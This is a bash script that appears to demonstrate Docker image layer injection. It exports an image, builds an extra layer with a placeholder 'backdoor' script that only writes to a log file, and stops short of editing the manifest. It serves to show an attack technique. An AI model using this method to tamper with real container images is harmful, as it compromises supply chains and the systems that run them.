#!/bin/bash
# Demonstrates layer injection by adding a malicious layer to an existing image
set -euo pipefail
IMAGE="${1:-webapp:latest}"
echo "[*] Exporting image..."
docker save "$IMAGE" -o /tmp/original.tar
mkdir -p /tmp/image-work && cd /tmp/image-work
tar xf /tmp/original.tar
echo "[*] Creating malicious layer..."
mkdir -p /tmp/malicious-layer/usr/local/bin
cat > /tmp/malicious-layer/usr/local/bin/backdoor << 'BACKDOOR'
#!/bin/sh
echo "LAYER INJECTION: backdoor executed" >> /tmp/injected.log
BACKDOOR
chmod +x /tmp/malicious-layer/usr/local/bin/backdoor
cd /tmp/malicious-layer && tar cf /tmp/image-work/malicious-layer.tar .
echo "[*] Adding layer to image manifest..."
echo "[!] In a real attack, the manifest.json and config are updated to include the new layer"
